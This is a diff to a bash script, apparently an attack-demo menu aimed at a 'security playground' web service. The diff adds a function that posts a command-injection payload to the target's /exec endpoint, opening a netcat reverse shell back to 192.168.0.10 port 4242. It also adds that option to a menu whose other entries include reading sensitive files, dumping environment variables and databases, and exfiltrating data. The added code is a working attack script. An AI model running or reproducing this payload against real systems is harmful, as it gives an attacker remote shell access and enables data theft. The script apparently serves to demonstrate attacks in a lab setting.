@@ -138,18 +138,35 @@ function exfiltrate_data() {
     printg "********************************************************************************"
 }
 
+function open_reverse_shell() {
+    printg "********************************************************************************"
+    echo ""
+	echo "Opening Reverse shell on target... "
+    echo "!!!!!!!! Make sure you have netcat listening for the reverse shell on 192.168.0.10 port 4242: nc -l 4242"
+    echo "The following curl command is about to be run, press any key to continue..."
+    echo "Command: curl -X POST ${sec_playground_url}/exec -d command='content=rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.10 4242 >/tmp/f'"
+    echo ""
+    echo "Press any key to continue..."
+    read
+    echo "--------------------------------------------------------------------------------"
+    curl -X POST ${sec_playground_url}/exec -d command='content=rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>%261|nc 192.168.0.10 4242 >/tmp/f'
+    echo ""
+	printg "********************************************************************************"
+}
+
 
 menu(){
 echo -ne "
 Select an Exploit:
 1) Read Sensitive File
 2) Write script to /tmp
-3) Exec bad script
+3) Run Script - Install nmap, bash
 4) Run Port Scan
 5) Dump Environment Variables
 6) Install PSQL Tools
 7) Dump DB
 8) Exfiltrate Data
+9) Open Reverse Shell
 0) Exit
 Choose an option: "
         read a
@@ -162,6 +179,7 @@ Choose an option: "
             6) install_psql_tools ; menu ;;
             7) dump_db ; menu ;;
             8) exfiltrate_data ; menu ;;
+            9) open_reverse_shell ; menu ;;
 		0) exit 0 ;;
         esac
 }
